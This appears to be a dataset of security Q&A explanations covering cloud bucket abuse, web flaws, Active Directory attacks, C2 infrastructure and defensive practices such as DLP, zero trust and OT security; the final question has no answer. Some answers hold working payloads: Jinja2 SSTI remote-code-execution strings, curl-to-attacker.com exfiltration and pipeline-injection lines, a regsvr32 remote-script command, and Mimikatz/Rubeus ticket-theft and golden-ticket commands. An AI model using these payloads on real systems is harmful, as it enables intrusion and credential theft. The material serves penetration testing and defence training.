Bucket name guessing: company-name, company-name-backup, company-name-data, company-name-static, company-name-assets, company-prod-backup, company-dev, company-staging; combine with company name + common suffixes. Testing access: aws s3 ls s3://BUCKET-NAME --no-sign-request (unauthenticated check); aws s3 ls s3://BUCKET-NAME (authenticated, shows if you have list permission); GetBucketAcl via API to check public permissions. Exploitation if public: aws s3 cp s3://BUCKET-NAME/sensitive-file. --no-sign-request; aws s3 sync s3://BUCKET-NAME. --no-sign-request (download entire bucket); look for: database backups (.sql,.bak), configuration files (.env, config.json, secrets.json), private keys (.pem,.key), source code archives (.zip,.tar.gz), credential files, user data. Write access: aws s3 cp malicious-file.html s3://BUCKET/ --no-sign-request; if bucket hosts website = stored XSS or phishing page; upload webshell if server executes; modify JS files for client-side supply chain attack. Reporting impact: demonstrate impact beyond just list access; download a sensitive file; show blast radius. Remediation: enable S3 Block Public Access at account level; remove public ACLs and bucket policies granting public access; use presigned URLs for temporary access; enable access logging on all buckets.
What is the difference between authentication and authorization vulnerabilities?

Authentication: verifying WHO you are (identity); vulnerabilities: broken login (no account lockout, weak passwords allowed, credential stuffing), MFA bypass, session token prediction, JWT algorithm confusion. Authorization: verifying WHAT you are allowed to do (access control); vulnerabilities: IDOR, privilege escalation, missing function-level access control. Authentication vulnerabilities: (1) No account lockout: brute-force login endpoint; no captcha, no rate limiting, no lockout after N failures; test with Hydra or Burp Intruder. (2) Username enumeration: different error messages for invalid username vs invalid password; response time difference (hash computation only for valid usernames in some implementations); use same error message regardless of failure reason. (3) Credential stuffing: use HaveIBeenPwned breach database; test leaked email:password combinations; effective because 60%+ users reuse passwords. (4) MFA bypass: directly request /dashboard after providing correct username and password without completing MFA step (MFA check only on /verify-otp endpoint, not enforced by middleware on all protected routes); backup codes without rate limiting; SIM swapping to intercept SMS OTP. Authorization vulnerabilities: (1) Horizontal privilege escalation: user A accesses user B resources (IDOR); same privilege level, different user. (2) Vertical privilege escalation: regular user accesses admin function; change role=user to role=admin in request; access /admin/ without admin check. (3) Path traversal to admin: /api/v1/admin accessible without auth check despite login required. Testing: use two accounts; test all endpoints from non-privileged account; use Autorize Burp extension to replay all requests as lower-privilege user automatically.
Explain OWASP Top 10 2021 and how to test for each category.

OWASP Top 10 2021: A01 Broken Access Control (moved from #5 to #1): missing authorization checks, IDOR, CORS misconfiguration, path traversal; test: attempt to access other users data by changing IDs, test admin endpoints without admin role. A02 Cryptographic Failures: sensitive data in HTTP (not HTTPS), weak ciphers, hardcoded keys, cleartext passwords in DB; test: check HTTPS enforcement, inspect response for sensitive data, review cipher suite with testssl.sh. A03 Injection (SQL, Command, LDAP, SSTI): user input in queries/commands; test: fuzz all inputs with SQLmap, manual injection testing, SAST scan. A04 Insecure Design: missing security controls at design level, no rate limiting, no fraud controls; test: business logic testing, abuse case analysis. A05 Security Misconfiguration: default credentials, open admin interfaces, unnecessary features enabled, missing security headers, verbose error messages; test: scan with Nikto, check security headers at securityheaders.com, try default credentials. A06 Vulnerable and Outdated Components: known CVEs in libraries, frameworks, OS; test: SCA with Snyk/Dependabot, check CVE for all versions. A07 Identification and Authentication Failures: weak passwords allowed, no MFA, insecure session management; test: test lockout, session fixation, check cookie flags. A08 Software and Data Integrity Failures: CI/CD pipeline compromise, insecure deserialization, unsigned updates; test: check SRI hashes on CDN scripts, test deserialization endpoints. A09 Security Logging and Monitoring Failures: no logging of auth failures, insufficient log detail; test: verify security events are logged, test if alerts fire. A10 Server-Side Request Forgery (SSRF): server fetches attacker-specified URL; test: all URL parameters with internal IPs, cloud metadata endpoint.
How do you exploit clickjacking with X-Frame-Options missing?

Clickjacking exploitation when X-Frame-Options not set: (1) Verify frameability: create test HTML: <iframe src="https://target.com/sensitive-action"> and load in browser; if target loads in iframe, it is frameable; also check CSP frame-ancestors header. (2) Identify high-value target actions: one-click actions on authenticated pages: change email, change password, transfer funds, delete account, publish/post, grant permission; target must execute without additional input (or with predictable input). (3) Construct attack page: overlay transparent iframe over decoy buttons: iframe style="opacity:0.01; position:absolute; top:OFFSET; left:OFFSET; width:TARGET_WIDTH; height:TARGET_HEIGHT"; position iframe so the sensitive button aligns with decoy button victim sees; victim clicks decoy, actually clicks target button inside iframe. (4) UI tuning: use opacity:0 to make iframe invisible; use CSS pointer-events to align clickable area; test with opacity:0.5 to verify alignment then set to 0 for attack. (5) Multi-step clickjacking: for multi-click flows, sequence multiple iframe positions; use JavaScript to move iframe or swap iframes between clicks. Dragjacking: use HTML drag-and-drop to extract sensitive data (token, CSRF token visible in DOM) by dragging to attacker-controlled textarea. Tapjacking: mobile version -- touch events on hidden overlay. Defense: X-Frame-Options: DENY or SAMEORIGIN response header; Content-Security-Policy: frame-ancestors none; both headers for broad coverage; X-Frame-Options not supported by some older browsers (CSP covers modern browsers). JavaScript framebusting (weak): if (top != self) top.location = self.location; bypassed by sandbox iframe attribute.
How do you perform subdomain takeover?

Subdomain takeover: DNS CNAME record points to external service; service account deleted/expired but DNS record remains; attacker registers the service and controls the subdomain. Example: app.company.com CNAME company.azurewebsites.net; company stops using Azure Web App and deletes it; company.azurewebsites.net is now available; attacker registers that Azure Web App hostname; now controls app.company.com. Impact: serve phishing page on legitimate company subdomain; bypass subdomain-based CORS policies (attacker domain now whitelisted); steal cookies if SameSite=None or if domain cookie set on parent domain; receive emails if MX records affected; OAuth redirect_uri validation bypassed (legitimate subdomain). Vulnerable services: Amazon S3 (bucket doesn't exist), Azure App Service (app deleted), GitHub Pages (repo deleted or unconfigured), Heroku (app deleted), Fastly, SendGrid, HubSpot, Tumblr, many others. Discovery: run subdomain enumeration (amass, subfinder); for each subdomain, check CNAME chain: dig CNAME subdomain; follow chain to canonical name; check if canonical service is available (S3 bucket: NoSuchBucket error; Azure: App not configured; GitHub Pages: no repository). Tools: subjack (automated subdomain takeover scanner); can-i-take-over-xyz (GitHub repo listing vulnerable services and fingerprints); nuclei with takeover templates. Exploitation: register the pointing service with the exact hostname/bucket name; host proof-of-concept page. Remediation: remove stale DNS records when decommissioning services; audit DNS records quarterly for orphaned CNAMEs; use DNS record management lifecycle tracking.
What is a supply chain attack and how do you defend against it?

Supply chain attack: compromise software or infrastructure through a trusted third-party component or vendor. Types: (1) Source code compromise: SolarWinds (SUNBURST, 2020) -- attackers with access to SolarWinds build environment injected malicious code into Orion updates; 18,000 organisations downloaded trojanised update; update was signed by SolarWinds certificate; passed all validation. (2) Dependency confusion: attacker publishes package to public npm/PyPI registry with same name as internal private package but higher version number; developer or CI builds pull public package instead of internal; executes attacker code in build environment; discovered by Alex Birsan 2021; affected Apple, Microsoft, PayPal. (3) Typosquatting: attacker publishes colourama (vs colorama), reqeusts (vs requests); developers make typo in install command. (4) Compromised contributor: social engineering or account takeover of legitimate open-source maintainer; malicious commit added to popular library. (5) CI/CD pipeline compromise: compromise GitHub Actions, Jenkins, TeamCity; malicious workflow exfiltrates secrets, injects backdoor into build artifacts. Defense: (1) Software Bill of Materials (SBOM): track all dependencies and their versions; Syft, CycloneDX; detect unexpected changes. (2) Dependency pinning: pin to exact version and hash (npm package-lock.json with integrity hashes, Python requirements.txt with --hash). (3) Private package mirror: npm proxy, PyPI mirror; only approved packages in mirror. (4) Code signing verification: verify signatures on all dependencies; sigstore/cosign for container images and packages. (5) CI/CD security: minimal permissions for CI; separate build environments; review pipeline changes.
How do you secure CI/CD pipelines?

CI/CD pipeline security: pipelines run privileged code and have access to production secrets, cloud credentials, and deployment mechanisms. Threat model: compromised pipeline = arbitrary code execution in privileged context = code deployed to production, secrets exfiltrated, infrastructure modified. Key risks: (1) Secret exposure: secrets in environment variables, pipeline YAML files, or build logs; secrets printed during verbose output; debug output reveals credentials. (2) Pipeline injection: user-controlled data (branch name, PR title, issue body) interpolated into pipeline YAML or script without sanitisation; attacker creates branch named $(curl attacker.com | bash) to exfiltrate secrets. (3) Dependency poisoning: build pulls malicious package; builds trust package installation from internet without verification. (4) Excessive permissions: service account with AdministratorAccess for all deployment targets instead of least-privilege per-environment. (5) Unprotected main branch: any contributor can merge malicious code to main triggering automated deployment. Hardening: (1) Separate secrets per environment; use OIDC federation (GitHub Actions OIDC with AWS IAM -- no static credentials needed; ephemeral short-lived tokens per workflow run). (2) Restrict where privileged jobs run: protect main branch; require PR review; only run deployment jobs on protected branches. (3) Least-privilege service accounts: deploy-dev role cannot deploy to prod; separate credentials per environment. (4) Pipeline-as-code review: treat pipeline YAML as code; require review for pipeline changes. (5) Dependency integrity: use lock files with hashes; private package mirrors for internal packages; SCA scan in pipeline. (6) Immutable artifacts: build once (create signed artifact), deploy everywhere (same artifact to each env); prevents environment-specific builds that could differ. (7) Audit logging: log all pipeline runs, secret accesses, deployment events.
Explain the concept of zero trust architecture.

Zero Trust: security model where no user, device, or network segment is trusted by default -- even inside the corporate perimeter. Traditional model: trust everything inside the firewall; once on corporate network, broad access assumed; VPN provides perimeter access; insider threats and lateral movement flourish. Zero Trust principles: (1) Verify explicitly: authenticate and authorise every request based on all available signals (identity, location, device health, service/workload, data classification); not just verify once at network boundary. (2) Least privilege access: grant minimum access needed for task; just-in-time and just-enough-access; time-limited; constrained resource scope. (3) Assume breach: design as if attacker is already inside; micro-segment networks; limit lateral movement; encrypt all traffic; collect telemetry; detect anomalies. Implementation components: Identity: strong MFA for all users; conditional access policies (block from unknown device, unknown country); privileged identity management with JIT elevation. Device: device compliance check before access (managed, patched, not jailbroken); mobile device management (MDM); device certificate. Network: microsegmentation; software-defined perimeter; network access limited to specific resources not entire subnet; ZTNA (Zero Trust Network Access) replaces VPN. Application: API gateway authentication for all internal apps; application-level access control; not just network-level. Data: classify data; encrypt in transit and at rest; DLP controls. Monitoring: continuous monitoring; behavioural analytics (UEBA); SIEM integration; real-time risk scoring. Frameworks: NIST SP 800-207 (Zero Trust Architecture); Microsoft Zero Trust adoption guide; Zscaler SASE; Palo Alto Prisma Access.
How do you perform reconnaissance on a target before an engagement?

Passive reconnaissance (OSINT -- no direct target interaction): (1) WHOIS: domain registration info, registrant, nameservers, registration date; historical WHOIS via DomainTools reveals past ownership and infrastructure. (2) DNS: dig, nslookup, dnsx; enumerate A, AAAA, MX, NS, TXT, CNAME, SOA records; zone transfer attempt (dig axfr @ns1.target.com target.com -- rarely works but worth trying); Passive DNS databases (SecurityTrails, VirusTotal passivedns). (3) Certificate Transparency: crt.sh, certspotter; all SSL certs publicly logged; reveals subdomains, internal domain names, development hostnames. (4) Shodan / Censys: search for IP ranges, exposed services, banners, tech stack; Shodan: org:"Target Corp"; hostname:target.com; Censys: ip:RANGE. (5) Google dorks: site:target.com filetype:pdf (public documents with metadata); site:target.com inurl:admin; site:target.com ext:sql; cache:target.com/secret-page. (6) LinkedIn: employee names, job titles, org chart, technology mentions in job descriptions (Java, AWS, Kubernetes = tech stack); email format discovery (first.last@company.com). (7) GitHub: org:targetcompany password OR api_key OR secret OR access_token; leaked credentials, internal URLs, infrastructure details. (8) Job postings: tech stack, security tools used, compliance requirements. Active reconnaissance (light interaction, may be logged): (9) DNS brute force: dnsx, dnsrecon; wordlist of common subdomains. (10) Web tech: whatweb, wappalyzer, builtwith; CMS detection, server version. (11) Email security: test SPF, DMARC, DKIM via MXToolbox; weak email security = phishing opportunity.
What is lateral movement and which tools do attackers use?

Lateral movement: techniques attackers use to progressively move through a network after initial compromise. Goals: access more systems; find sensitive data; escalate privileges; reach primary target. Remote service exploitation: PsExec (Sysinternals): creates service on remote host via admin share; requires admin credentials and SMB access; very noisy (Event 7045 new service). WMI (Windows Management Instrumentation): Win32_Process.Create for remote code execution; more stealthy than PsExec; Event 4688 if process auditing enabled. WinRM/PowerShell Remoting: Enter-PSSession, Invoke-Command; requires WinRM service running; port 5985 HTTP or 5986 HTTPS. Pass-the-Hash movement: CrackMapExec smb TARGET -u admin -H NTLM_HASH --local-auth to test hash on all targets; valid hash = lateral movement to any host where that account is local admin. Kerberos-based: Pass-the-Ticket with stolen TGT; Overpass-the-Hash (use NTLM hash to get Kerberos ticket); S4U2Self/S4U2Proxy for delegation abuse. Remote Desktop (RDP): xfreerdp, mstsc; requires credentials or certificate; restrictedAdmin mode allows PtH. Application-specific: SQL Server linked servers (execute query on linked server); Exchange impersonation; MSSQL xp_cmdshell. Tools: Metasploit (PSExec module, SMB relay module); Impacket suite (wmiexec, psexec, smbexec, atexec); Evil-WinRM; CrackMapExec (SMB, WMI, WINRM modules); Cobalt Strike (jump psexec, jump wmi, jump winrm commands in beacon). Detection: unusual process parents (WmiPrvSE, services.exe); Event 4624 Type 3 logon from unexpected source; new service creation (7045) from non-standard processes; SMB connections from workstations to other workstations.
Explain red team infrastructure and C2 frameworks.

Red team infrastructure: purpose-built attack infrastructure that obscures attacker origin and provides resilient command and control. Components: (1) Redirectors: intermediary servers between C2 and target; target beacons to redirector; redirector forwards to C2; if redirector discovered and blocked, swap it out without losing C2; use nginx/Apache with reverse proxy; CDN (Cloudflare) as redirector -- C2 traffic looks like CDN traffic. (2) Domain fronting: route C2 traffic through CDN; HTTP Host header points to C2 domain but TLS SNI and actual connection goes to CDN; CDN forwards internally to C2 domain; appears as connection to legitimate CDN. (3) Categorised domains: purchase aged domains with web history and reputation; categorise as IT/Technology in reputation databases before use; bypasses proxy category filtering. (4) Cloud infrastructure: use cloud providers (AWS EC2, Azure, DO, Vultr) for redirectors; different providers for different operations; pay with gift cards or crypto for attribution resistance. C2 Frameworks: Cobalt Strike (commercial, ~$5K/year): Malleable C2 profiles mimic legitimate traffic (Amazon, Bing, Google); team server for collaboration; listener types (HTTP, HTTPS, DNS, SMB); beacon payload; extensive post-ex toolkit; most popular commercial tool. Sliver (open source, Bishopfox): HTTP/HTTPS/DNS/mTLS C2; multi-player; implant generation; similar to Cobalt Strike. Havoc (open source): modern C2 with staged shellcode; Demon implant; good OPSEC. Brute Ratel C4 (commercial): designed to evade EDR; popular with threat actors. C2 OPSEC: rotate domains; use HTTPS with valid certificates; match beacon timing to legitimate traffic patterns; use legitimate cloud services (OneDrive, Dropbox) as C2 channel (C2-over-OneDrive).
How do you exploit Server-Side Template Injection in Jinja2?

Jinja2 SSTI (Python Flask/Django Jinja2 templates): when user input is directly rendered as template without sanitisation. Detection: inject {{7*7}}; if 49 in response, Jinja2 SSTI confirmed; {{7*"7"}} returns 7777777 (confirms Jinja2 vs Twig which returns 49). Basic exploitation: Jinja2 has access to Python globals via __class__ attribute chain: {{"".__class__}} returns str class; {{"".__class__.__mro__}} returns method resolution order including object; {{"".__class__.__mro__[1].__subclasses__()}} lists all Python subclasses in memory. Find useful class: iterate subclasses to find subprocess.Popen or os._wrap_close or warnings.catch_warnings; RCE: {{"".__class__.__mro__[1].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()}} (index may vary by Python version). Simpler RCE with request object: {{request.__class__.__mro__[1].__subclasses__()}} or {{config.__class__.__init__.__globals__["os"].popen("id").read()}}. Filter bypass (when curly braces or dots filtered): use request.args: {{request|attr(request.args.a)}} with URL param ?a=__class__; chain multiple attr() calls to avoid dots; use request.application.import_name to get Flask app; use _|int, _|string for type coercion. Blind SSTI (no reflection): exfiltrate via DNS: {{config.__class__.__init__.__globals__["os"].popen("curl http://attacker.com/$(id|base64)").read()}}. Read files: {{config.__class__.__init__.__globals__["open"]("/etc/passwd").read()}}. Tool: tplmap automates SSTI detection and exploitation across Jinja2, Twig, Freemarker, Smarty, etc.
What is pass-the-ticket (PTT) attack?

Pass-the-Ticket: steal and reuse Kerberos ticket-granting tickets (TGT) or service tickets; authenticate without password; memory-based attack. Kerberos ticket basics: TGT (Ticket Granting Ticket): obtained after initial authentication; used to request service tickets from KDC; valid for 10 hours by default; renewable; service ticket (TGS): issued for specific service (cifs/server.corp.com); used to access that service; both tickets stored in LSASS memory on Windows. Extracting tickets: Mimikatz: sekurlsa::tickets /export (dumps all Kerberos tickets from LSASS memory to.kirbi files); requires local admin; Rubeus: Rubeus.exe dump /nowrap (dumps base64 tickets from memory); Rubeus.exe triage (list all tickets without extracting); klist (Windows built-in): view own tickets without admin; what you get:.kirbi files containing TGT or service tickets; base64-encoded ticket data. Injecting tickets: Rubeus.exe ptt /ticket:BASE64_TICKET (inject ticket into current session); Mimikatz: kerberos::ptt ticket.kirbi; after injection: klist shows injected ticket; access resources using injected identity; example: steal admin TGT from memory; inject into attacker session; now act as admin; request service tickets for any service. Golden ticket (related concept): forge TGT using KRBTGT account hash; DCSync or DC compromise to obtain KRBTGT hash; Mimikatz: kerberos::golden /user:Administrator /domain:corp.com /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt; creates TGT valid for any user; default validity 10 years; domain persistence even if all user passwords reset; detection: event ID 4769 with unusual ticket parameters (non-standard lifetime, encryption type mismatch); Silver ticket (related): forge service ticket using service account hash; no DC communication required; more stealthy than golden ticket; limited to specific service. Detection: event 4768 (TGT requested): client IP mismatch from credential location; event 4769 (service ticket requested): requested by unexpected service or user; event 4624 (logon): logon type 9 (NewCredentials) with Kerberos can indicate ticket injection; Microsoft Defender for Identity: detects golden ticket anomalies (ticket with invalid timestamp or lifetime); Rubeus detect: Microsoft Defender detects Rubeus binary; amsi-bypass needed. Prevention: reduce TGT lifetime: shorter lifetime reduces window; credential guard: isolates LSASS in virtual trust level; prevents Mimikatz from reading LSASS memory; limit privileged access to jump servers; Protected Users group: TGTs non-renewable; no delegation; Kerberos AES only; KRBTGT password reset: golden ticket defense; reset KRBTGT password twice (invalidates all outstanding TGTs); planned operation; causes brief disruption.
What is a cyber insurance policy from a security perspective?

Cyber insurance: financial protection against cybersecurity incidents; transfer residual risk; supplement security controls. Coverage components: first-party coverage (your own losses): incident response costs (IR firm, forensics, legal); business interruption (revenue lost while systems down); data recovery and restoration; ransom payment (if negotiating with attackers); notification costs (breach notification to customers, regulators); credit monitoring for affected individuals; reputational harm (crisis communications); third-party coverage (others claims against you): customer lawsuits (data breach causing their loss); regulatory fines and penalties (GDPR, HIPAA, PCI DSS); media liability (defamation, copyright infringement); network security liability (failure to prevent attack that impacts third party). Underwriting: cyber insurance application asks: security controls in place; MFA deployment (especially remote access); EDR/AV deployment; backup procedures and testing; incident response plan; security awareness training; vulnerability management programme; third-party risk management; previous incidents; insurers score security controls; better controls = lower premium; inadequate controls = coverage denied or exclusions. Security requirements as conditions: insurers increasingly mandate controls as coverage conditions; if breach occurs and control was not in place (as required): claim may be denied; example: insurer requires MFA for remote access; breach occurs via RDP without MFA; claim denied; trend: higher baseline requirements each renewal cycle; some insurers sending security questionnaires + technical validation (external scanning). Exclusions (what is not covered): war exclusion: attacks attributed to nation-state (NotPetya: Lloyd's excluded, Merck case); industry watching Lloyd's 2023 guidance on war exclusion; unencrypted data: if required encryption not implemented; social engineering limits: often separate sublimit for BEC wire fraud; prior known incidents; infrastructure exclusions: industrial control systems may be excluded. Claims process: notify insurer within required window (48-72 hours typical); use insurer-approved IR vendor (insurer has panel); insurer approves major expenditures; insurer controls ransom negotiation if applicable; IR firm preserves evidence; determine coverage; pay covered costs. Market trends: 2020-2022: rapid premium increase (ransomware surge); 200-300% increases; 2022-2024: market stabilising; insurers adding requirements; cyber insurance maturation: evolving to risk management partnership; security ratings, continuous monitoring required; aggregate limits: total claims across portfolio; systemic risk concern (widespread attack hitting many policyholders simultaneously).
What is vulnerability prioritisation beyond CVSS?

Vulnerability prioritisation: determine which vulnerabilities to fix first; CVSS score alone insufficient; contextualise to your environment and threat. Why CVSS alone fails: CVSS measures severity in isolation; does not consider: is this system exposed to internet? Is it exploitable with public exploit? Is it being actively exploited in the wild?; CVSS 9.8 on isolated internal system with no exploit code: lower real risk than CVSS 6.5 on internet-facing system with active exploitation. SSVC (Stakeholder-Specific Vulnerability Categorization): CISA SSVC decision tree; factors: exploitation status (none, PoC, active), automatability (can attacker script exploitation at scale?), technical impact (partial, total), mission prevalence (how important is affected system to mission?); outputs: track (monitor), attend (fix within 1 month), out of cycle (fix within 1 week), immediate (fix now); does not use numeric score; decision tree outcome. EPSS (Exploit Prediction Scoring System): probability score (0-1) that vulnerability will be exploited in next 30 days; based on ML model trained on: NVD data, CVSS, CWE, published exploit code, PoC, Metasploit modules, malware using CVE; EPSS 0.95 = 95% probability of exploitation in next 30 days; use alongside CVSS: patch CVSS 7+ with EPSS > 0.1 first; data at first.org/epss. CISA KEV (Known Exploited Vulnerabilities): list of CVEs with confirmed exploitation in the wild; CISA BOD 22-01: federal agencies must patch KEV within 2 weeks (critical) or 6 months (others); organisations should treat KEV as highest priority; if vulnerability in KEV: exploit already exists and is being used; patch immediately regardless of CVSS score. Contextual factors for prioritisation: internet exposure: internet-facing systems: highest priority; internal-only: lower; if affected service exposed on internet: severity multiplied; exploitability: public exploit in Metasploit, ExploitDB, GitHub = high priority; no known exploit = lower; attack complexity: unauthenticated exploitation > authenticated required; data sensitivity: vulnerability on system holding PII, cardholder data, PHI = higher priority; compensating controls: WAF, network segmentation, MFA reduce risk even if unpatched. Risk-based prioritisation formula: risk = base severity (CVSS) x exploitation probability (EPSS) x exposure (internet-facing multiplier) x data sensitivity x compensating control deduction; patch schedule: immediate (24-48h): internet-facing, KEV, critical CVSS 9+, EPSS > 0.5; high (7 days): internet-facing CVSS 7+, EPSS > 0.1; medium (30 days): internal CVSS 7+, internet-facing lower severity; low (90 days): internal low severity.
What is application whitelisting?

Application whitelisting (application allowlisting): only permit explicitly approved applications to execute; block all others; significantly reduces malware execution risk. Approach: versus blacklisting (AV): AV identifies known bad; misses unknown malware (zero-day); allowlisting: permits only known good; blocks all unknown including zero-day malware; fundamentally different philosophy. What is whitelisted: application name and path: C:\Program Files\Microsoft\Edge\Application\msedge.exe; publisher certificate: any binary signed by Microsoft; hash: SHA-256 hash of specific binary version; limitation: specific hash changes with every update; Windows implementations: AppLocker: Windows Enterprise feature; rules based on: publisher (Authenticated, Signed by Microsoft), path (C:\Program Files\*), hash; deployed via Group Policy; protects: EXE, DLL, MSI, script (PS1, VBS, BAT, JS); Windows Defender Application Control (WDAC): more comprehensive; kernel-level enforcement; replaces AppLocker; user-mode and kernel-mode code integrity; WDAC policy types: base policy (what is allowed), supplemental policies; deployed via MDM or Group Policy; harder to bypass than AppLocker. Bypass techniques (for security testers): trusted paths: if C:\Windows\Temp\* allowed; attacker drops file there; signed but vulnerable binary: DLL search order hijacking; living off the land: PowerShell, WScript, MSHTA, Rundll32 are often allowed (Microsoft-signed); but can execute malicious scripts; script control: allowlisting must also restrict script execution (PSLockdownPolicy, Constrained Language Mode); LOLBins: regsvr32 /u /n /s /i:http://attacker.com/file.sct scrobj.dll (loads malicious COM script; often missed); Squiblydoo; WDAC bypass harder (kernel-level); UserWriteable paths bypass: if user-writable path is allowed: drop file there. Implementation guidance: start with audit mode: log what would be blocked without actually blocking; analyse 30 days; build allowlist from legitimate application inventory; add exceptions for business-critical applications; switch to enforce mode; process: help desk ticket process for new application approvals; shadow IT challenge: allowlisting reveals all unapproved software; update process: application updates may change hashes; publisher-based rules avoid hash management; exceptions: developer workstations: more relaxed policy or managed exceptions; test environment before production deployment; GPO deployment: target OUs; servers often easier than workstations (fewer applications).
What is cybersecurity for operational technology (OT) environments?

OT (Operational Technology) cybersecurity: secure industrial control systems (ICS), SCADA, PLCs, DCS controlling physical processes; different priorities from IT security. OT vs IT security differences: availability priority: OT: availability > integrity > confidentiality (opposite of IT); control system downtime = production loss, safety risk; patch management: OT systems cannot patch frequently; patches require vendor testing, planned downtime, engineering approval; lifecycle: OT equipment: 20-30 year lifetime; no security support after years; protocols: OT uses industrial protocols (Modbus, DNP3, OPC-UA, PROFINET, IEC 61850, Ethernet/IP); many have no authentication or encryption; safety: OT errors can cause physical harm, injury, death, environmental damage; security controls must not interfere with safety functions. OT threat landscape: nation-state attacks: critical infrastructure targets; Ukraine power grid attacks (2015, 2016: BlackEnergy, Industroyer); Triton/TRISIS (2017): targeted Schneider Electric safety controllers (Triconex) at Saudi petrochemical facility; could have caused explosion; ransomware: Colonial Pipeline (2021): IT ransomware; OT shutdown as precaution; disrupted fuel supply; Norsk Hydro (2019): aluminium smelter; systems across OT impact. Purdue Reference Model: Level 0-4 + DMZ: Level 0 (Process): sensors, actuators, field devices; Level 1 (Basic Control): PLCs, RTUs, DCS controllers; Level 2 (Supervisory): SCADA HMI, engineering workstations; Level 3 (Manufacturing Operations): historian, batch management, MES; ICS DMZ: data exchange zone; Level 4 (Business Planning): ERP, corporate IT; Network separation: ICS DMZ between Level 3 and Level 4; data diodes (one-way data transfer) where possible; no direct internet access to OT. ICS-specific controls: passive monitoring (no active scanning: active scanner can crash PLCs); Nozomi Networks, Claroty, Dragos: passive OT network monitoring; detect anomalies; device inventory; vulnerability identification without active scanning; application allowlisting on HMI and engineering workstations (industrial-specific: Rockwell, Schneider have limited change); USB control: air-gapped systems: USB only attack vector; disable USB; use Honeywell Secure Media Exchange for controlled data transfer; backup PLCs and DCS configurations; verify integrity; emergency response plan: OT incident response differs; safety first (manual operations); consult plant engineer before touching OT systems. Standards: IEC 62443: OT security standard; NIST SP 800-82: Guide to ICS Security; NERC CIP: North American electric utility cybersecurity requirements; ISA/IEC 62443: industrial automation and control systems security.
What is data loss prevention (DLP)?

DLP (Data Loss Prevention): detect and prevent sensitive data leaving organisation or being misused; protect against intentional and accidental data leakage. Why DLP: data is the target of most attacks; regulatory requirements mandate data protection (GDPR, PCI DSS, HIPAA); insider threats: employees intentionally or accidentally send sensitive data externally; DLP enforces data handling policies technically; sensitive data types: PII (names, addresses, SSNs, DOBs), financial data (credit card numbers, bank accounts), PHI (health records), intellectual property (source code, product plans, trade secrets), credentials (passwords, API keys). DLP deployment modes: network DLP: monitor and control data leaving network; inspect outbound email, web uploads, file transfers, cloud sync; requires SSL inspection for encrypted traffic; endpoint DLP: agent on endpoint; monitor file access, email, USB transfers, printing; works on and off corporate network; cloud DLP / CASB: monitor and control data in cloud applications; Google Workspace DLP, Microsoft Purview, McAfee MVISION Cloud; enforce policies in cloud collaboration tools. How DLP identifies sensitive data: regex patterns: credit card numbers (16 digits in groups), SSN (###-##-####), email addresses; data fingerprinting: exact copy of sensitive document; fingerprint document; detect if fragment appears in outbound traffic; ML classification: train model on sensitive vs non-sensitive data; classify documents by content; labelling integration: Microsoft Information Protection labels; DLP policy applies based on label (Confidential, Top Secret). DLP policy actions: monitor only: log and alert; no block; good for tuning without disruption; alert + allow: user gets notification; audit trail; user acknowledgement override; quarantine: hold for review before delivery; block: prevent data transmission; user-visible error; block + notify manager: alert user manager. Tuning: high false positive rate is DLP killer; start with monitor-only; analyse false positives; narrow patterns (more specific regex); whitelists for known legitimate exceptions; gradually move to enforce. Microsoft Purview DLP: integrated with Microsoft 365; native email, Teams, SharePoint, OneDrive; 100+ sensitive information types out of box; trainable classifiers; conditional access integration; endpoint DLP for Windows devices. Symantec DLP (Broadcom): comprehensive enterprise DLP; network, endpoint, cloud; Forcepoint DLP; Digital Guardian: strong IP protection; insider threat. DLP for cloud (CASB): discover shadow IT (which cloud apps are in use?); control data upload to unapproved apps; enforce DLP policies in approved apps (restrict sharing, prevent external download of sensitive files); Microsoft Defender for Cloud Apps (CASB) + Microsoft Purview DLP: integrated policy enforcement.
What is security awareness training programme design?

Security awareness training programme: educate employees on security risks and behaviours; reduce human-factor incidents. Why it matters: 85% of breaches involve human element (Verizon DBIR); phishing: most common initial access vector; employee mistakes: misconfigured systems, wrong email recipient, weak passwords; technical controls cannot compensate for all human error; regulations require training: HIPAA, PCI DSS, SOX, GDPR, ISO 27001. Training approach: compliance-focused vs behaviour change: compliance: annual CBT (computer-based training); click through; check the box; minimal behaviour change; behaviour change: targeted, engaging, role-relevant; reinforced with regular micro-learning; simulated phishing; measured by behaviour metrics not completion rates. Programme components: onboarding training: all new employees; cover basics: phishing, password, data handling, physical security, reporting; annual refresher: regulatory requirement; updated content; new threat landscape; monthly micro-learning: short (2-5 minute) content; specific topics; nudges and reminders; role-specific training: finance: BEC and wire transfer fraud; IT: privileged access, secure configuration; executives: targeted spear phishing, vishing; developers: secure coding (OWASP Top 10); phishing simulation: fake phishing emails sent to employees; track: click rate, credential entry rate, report rate; immediate education: click on simulated phish -> brief training moment; track improvement over time. Content types: video: engaging; entertaining; real scenarios; gamification: security quiz competitions; leaderboards; rewards; newsletters: monthly security tips; current threat landscape; interactive scenarios: branching simulations (what would you do?); posters and awareness campaigns: visual reinforcement in office; social media content for remote employees. Metrics: phishing click rate: industry average 20-30%; target < 5%; phishing report rate: % of employees who report simulated phish; target > 50%; training completion rate: 100% required for compliance; knowledge retention: post-training quiz scores; repeat offender rate: employees who click multiple times; incident reduction: measure security incidents attributed to human error; ROI: cost of training vs cost of breach. Vendors: KnowBe4: market leader; phishing simulation + training; Proofpoint Security Awareness Training; Cofense; Mimecast Awareness Training; custom: can build internal; content more relevant to specific organisation; requires dedicated resource. Culture: security culture: employees care about security; report incidents; challenge suspicious requests; achieved through: leadership visible commitment, positive reinforcement (reward reporters not blame clickers), blameless incident culture, security team accessible and helpful (not just policy police).
What is API security testing methodology?

